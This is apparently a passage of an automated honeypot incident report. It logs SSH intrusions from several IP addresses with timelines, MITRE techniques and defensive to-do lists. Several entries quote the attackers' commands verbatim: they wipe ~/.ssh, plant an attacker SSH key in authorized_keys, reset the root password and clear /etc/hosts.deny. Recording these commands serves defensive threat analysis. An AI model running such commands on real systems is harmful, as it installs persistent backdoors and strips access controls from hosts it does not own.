| **Last Seen** | 2026-04-23 15:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:18:37` | `cowrie.session.connect` |
| `2026-04-23 15:18:37` | `cowrie.client.version` |
| `2026-04-23 15:18:38` | `cowrie.client.kex` |
| `2026-04-23 15:18:38` | `cowrie.login.success` |
| `2026-04-23 15:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc636ded19f1

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:23 |
| **Last Seen** | 2026-04-23 15:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:23:24` | `cowrie.session.connect` |
| `2026-04-23 15:23:24` | `cowrie.client.version` |
| `2026-04-23 15:23:25` | `cowrie.client.kex` |
| `2026-04-23 15:23:25` | `cowrie.login.success` |
| `2026-04-23 15:23:25` | `cowrie.session.params` |
| `2026-04-23 15:23:25` | `cowrie.command.input` |
| `2026-04-23 15:23:25` | `cowrie.command.failed` |
| `2026-04-23 15:23:25` | `cowrie.log.closed` |
| `2026-04-23 15:23:26` | `cowrie.session.params` |
| `2026-04-23 15:23:26` | `cowrie.command.input` |
| `2026-04-23 15:23:26` | `cowrie.session.file_download` |
| `2026-04-23 15:23:26` | `cowrie.log.closed` |
| `2026-04-23 15:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-591c6aed3128

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:23 |
| **Last Seen** | 2026-04-23 15:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:23:28` | `cowrie.session.connect` |
| `2026-04-23 15:23:28` | `cowrie.client.version` |
| `2026-04-23 15:23:28` | `cowrie.client.kex` |
| `2026-04-23 15:23:29` | `cowrie.login.success` |
| `2026-04-23 15:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4585e16c63d3

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:25 |
| **Last Seen** | 2026-04-23 15:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:25:41` | `cowrie.session.connect` |
| `2026-04-23 15:25:41` | `cowrie.client.version` |
| `2026-04-23 15:25:41` | `cowrie.client.kex` |
| `2026-04-23 15:25:42` | `cowrie.login.success` |
| `2026-04-23 15:25:43` | `cowrie.session.params` |
| `2026-04-23 15:25:43` | `cowrie.command.input` |
| `2026-04-23 15:25:43` | `cowrie.command.failed` |
| `2026-04-23 15:25:43` | `cowrie.log.closed` |
| `2026-04-23 15:25:44` | `cowrie.session.params` |
| `2026-04-23 15:25:44` | `cowrie.command.input` |
| `2026-04-23 15:25:44` | `cowrie.session.file_download` |
| `2026-04-23 15:25:44` | `cowrie.log.closed` |
| `2026-04-23 15:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ba1829a001

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:25 |
| **Last Seen** | 2026-04-23 15:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:25:48` | `cowrie.session.connect` |
| `2026-04-23 15:25:48` | `cowrie.client.version` |
| `2026-04-23 15:25:48` | `cowrie.client.kex` |
| `2026-04-23 15:25:50` | `cowrie.login.success` |
| `2026-04-23 15:25:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a040001d9d38

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:27 |
| **Last Seen** | 2026-04-23 15:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:27:26` | `cowrie.session.connect` |
| `2026-04-23 15:27:26` | `cowrie.client.version` |
| `2026-04-23 15:27:26` | `cowrie.client.kex` |
| `2026-04-23 15:27:26` | `cowrie.login.success` |
| `2026-04-23 15:27:27` | `cowrie.session.params` |
| `2026-04-23 15:27:27` | `cowrie.command.input` |
| `2026-04-23 15:27:27` | `cowrie.command.failed` |
| `2026-04-23 15:27:27` | `cowrie.log.closed` |
| `2026-04-23 15:27:27` | `cowrie.session.params` |
| `2026-04-23 15:27:27` | `cowrie.command.input` |
| `2026-04-23 15:27:27` | `cowrie.session.file_download` |
| `2026-04-23 15:27:27` | `cowrie.log.closed` |
| `2026-04-23 15:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b706321bc1

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:27 |
| **Last Seen** | 2026-04-23 15:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:27:29` | `cowrie.session.connect` |
| `2026-04-23 15:27:29` | `cowrie.client.version` |
| `2026-04-23 15:27:29` | `cowrie.client.kex` |
| `2026-04-23 15:27:30` | `cowrie.login.success` |
| `2026-04-23 15:27:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edff63dbf411

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:27 |
| **Last Seen** | 2026-04-23 15:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:27:55` | `cowrie.session.connect` |
| `2026-04-23 15:27:55` | `cowrie.client.version` |
| `2026-04-23 15:27:55` | `cowrie.client.kex` |
| `2026-04-23 15:27:57` | `cowrie.login.success` |
| `2026-04-23 15:27:57` | `cowrie.session.params` |
| `2026-04-23 15:27:57` | `cowrie.command.input` |
| `2026-04-23 15:27:57` | `cowrie.command.failed` |
| `2026-04-23 15:27:58` | `cowrie.log.closed` |
| `2026-04-23 15:27:58` | `cowrie.session.params` |
| `2026-04-23 15:27:58` | `cowrie.command.input` |
| `2026-04-23 15:27:59` | `cowrie.session.file_download` |
| `2026-04-23 15:27:59` | `cowrie.log.closed` |
| `2026-04-23 15:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7d123c9e6d7

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:28 |
| **Last Seen** | 2026-04-23 15:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:28:02` | `cowrie.session.connect` |
| `2026-04-23 15:28:02` | `cowrie.client.version` |
| `2026-04-23 15:28:03` | `cowrie.client.kex` |
| `2026-04-23 15:28:04` | `cowrie.login.success` |
| `2026-04-23 15:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45acbd9af48

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]254` |
| **First Seen** | 2026-04-23 15:29 |
| **Last Seen** | 2026-04-23 15:30 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:xYOgzV2BUq3q"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:29:57` | `cowrie.session.connect` |
| `2026-04-23 15:29:57` | `cowrie.client.version` |
| `2026-04-23 15:29:57` | `cowrie.client.kex` |
| `2026-04-23 15:29:57` | `cowrie.login.success` |
| `2026-04-23 15:29:58` | `cowrie.session.params` |
| `2026-04-23 15:29:58` | `cowrie.command.input` |
| `2026-04-23 15:29:58` | `cowrie.command.failed` |
| `2026-04-23 15:29:58` | `cowrie.log.closed` |
| `2026-04-23 15:29:58` | `cowrie.session.params` |
| `2026-04-23 15:29:58` | `cowrie.command.input` |
| `2026-04-23 15:29:59` | `cowrie.session.file_download` |
| `2026-04-23 15:29:59` | `cowrie.log.closed` |
| `2026-04-23 15:30:11` | `cowrie.session.params` |
| `2026-04-23 15:30:11` | `cowrie.command.input` |
| `2026-04-23 15:30:11` | `cowrie.log.closed` |
| `2026-04-23 15:30:12` | `cowrie.session.params` |
| `2026-04-23 15:30:12` | `cowrie.command.input` |
| `2026-04-23 15:30:12` | `cowrie.log.closed` |
| `2026-04-23 15:30:12` | `cowrie.session.params` |
| `2026-04-23 15:30:12` | `cowrie.command.input` |
| `2026-04-23 15:30:13` | `cowrie.session.file_download` |
| `2026-04-23 15:30:13` | `cowrie.log.closed` |
| `2026-04-23 15:30:13` | `cowrie.session.params` |
| `2026-04-23 15:30:13` | `cowrie.command.input` |
| `2026-04-23 15:30:13` | `cowrie.log.closed` |
| `2026-04-23 15:30:13` | `cowrie.session.params` |
| `2026-04-23 15:30:13` | `cowrie.command.input` |
| `2026-04-23 15:30:13` | `cowrie.log.closed` |
| `2026-04-23 15:30:14` | `cowrie.session.params` |
| `2026-04-23 15:30:14` | `cowrie.command.input` |
| `2026-04-23 15:30:14` | `cowrie.command.input` |
| `2026-04-23 15:30:14` | `cowrie.log.closed` |
| `2026-04-23 15:30:15` | `cowrie.session.params` |
| `2026-04-23 15:30:15` | `cowrie.command.input` |
| `2026-04-23 15:30:15` | `cowrie.log.closed` |
| `2026-04-23 15:30:16` | `cowrie.session.params` |
| `2026-04-23 15:30:16` | `cowrie.command.input` |
| `2026-04-23 15:30:16` | `cowrie.log.closed` |
| `2026-04-23 15:30:16` | `cowrie.session.params` |
| `2026-04-23 15:30:16` | `cowrie.command.input` |
| `2026-04-23 15:30:16` | `cowrie.log.closed` |
| `2026-04-23 15:30:17` | `cowrie.session.params` |
| `2026-04-23 15:30:17` | `cowrie.command.input` |
| `2026-04-23 15:30:17` | `cowrie.log.closed` |
| `2026-04-23 15:30:17` | `cowrie.session.params` |
| `2026-04-23 15:30:17` | `cowrie.command.input` |
| `2026-04-23 15:30:18` | `cowrie.log.closed` |
| `2026-04-23 15:30:18` | `cowrie.session.params` |
| `2026-04-23 15:30:18` | `cowrie.command.input` |
| `2026-04-23 15:30:18` | `cowrie.log.closed` |
| `2026-04-23 15:30:18` | `cowrie.session.params` |
| `2026-04-23 15:30:18` | `cowrie.command.input` |
| `2026-04-23 15:30:18` | `cowrie.log.closed` |
| `2026-04-23 15:30:19` | `cowrie.session.params` |
| `2026-04-23 15:30:19` | `cowrie.command.input` |
| `2026-04-23 15:30:19` | `cowrie.log.closed` |
| `2026-04-23 15:30:19` | `cowrie.session.params` |
| `2026-04-23 15:30:19` | `cowrie.command.input` |
| `2026-04-23 15:30:19` | `cowrie.log.closed` |
| `2026-04-23 15:30:20` | `cowrie.session.params` |
| `2026-04-23 15:30:20` | `cowrie.command.input` |
| `2026-04-23 15:30:20` | `cowrie.log.closed` |
| `2026-04-23 15:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.105[.]254` to AbuseIPDB if not already reported
- [ ] Block `14.103.105[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10a8f394408a

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:32 |
| **Last Seen** | 2026-04-23 15:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:32:12` | `cowrie.session.connect` |
| `2026-04-23 15:32:12` | `cowrie.client.version` |
| `2026-04-23 15:32:13` | `cowrie.client.kex` |
| `2026-04-23 15:32:14` | `cowrie.login.success` |
| `2026-04-23 15:32:15` | `cowrie.session.params` |
| `2026-04-23 15:32:15` | `cowrie.command.input` |
| `2026-04-23 15:32:15` | `cowrie.command.failed` |
| `2026-04-23 15:32:15` | `cowrie.log.closed` |
| `2026-04-23 15:32:16` | `cowrie.session.params` |
| `2026-04-23 15:32:16` | `cowrie.command.input` |
| `2026-04-23 15:32:16` | `cowrie.session.file_download` |
| `2026-04-23 15:32:16` | `cowrie.log.closed` |
| `2026-04-23 15:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-802938afeb5a

| Field | Detail |
|---|---|
| **Source IP** | `177.91.180[.]81` |
| **First Seen** | 2026-04-23 15:32 |
| **Last Seen** | 2026-04-23 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:32:19` | `cowrie.session.connect` |
| `2026-04-23 15:32:19` | `cowrie.client.version` |
| `2026-04-23 15:32:20` | `cowrie.client.kex` |
| `2026-04-23 15:32:21` | `cowrie.login.success` |
| `2026-04-23 15:32:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.91.180[.]81` to AbuseIPDB if not already reported
- [ ] Block `177.91.180[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7b02aff19d

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:32 |
| **Last Seen** | 2026-04-23 15:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:32:58` | `cowrie.session.connect` |
| `2026-04-23 15:32:58` | `cowrie.client.version` |
| `2026-04-23 15:32:58` | `cowrie.client.kex` |
| `2026-04-23 15:32:59` | `cowrie.login.success` |
| `2026-04-23 15:32:59` | `cowrie.session.params` |
| `2026-04-23 15:32:59` | `cowrie.command.input` |
| `2026-04-23 15:32:59` | `cowrie.command.failed` |
| `2026-04-23 15:32:59` | `cowrie.log.closed` |
| `2026-04-23 15:32:59` | `cowrie.session.params` |
| `2026-04-23 15:32:59` | `cowrie.command.input` |
| `2026-04-23 15:32:59` | `cowrie.session.file_download` |
| `2026-04-23 15:32:59` | `cowrie.log.closed` |
| `2026-04-23 15:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c81899da341d

| Field | Detail |
|---|---|
| **Source IP** | `43.100.61[.]6` |
| **First Seen** | 2026-04-23 15:33 |
| **Last Seen** | 2026-04-23 15:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 15:33:01` | `cowrie.session.connect` |
| `2026-04-23 15:33:01` | `cowrie.client.version` |
| `2026-04-23 15:33:01` | `cowrie.client.kex` |
| `2026-04-23 15:33:02` | `cowrie.login.success` |
| `2026-04-23 15:33:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.61[.]6` to AbuseIPDB if not already reported
- [ ] Block `43.100.61[.]6` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bda997c132c8

| Field | Detail |
|---|---|
| **Source IP** | `14.103.105[.]254` |
| **First Seen** | 2026-04-23 15:33 |
| **Last Seen** | 2026-04-23 15:33 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:vXI6ctXMZL9z"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**
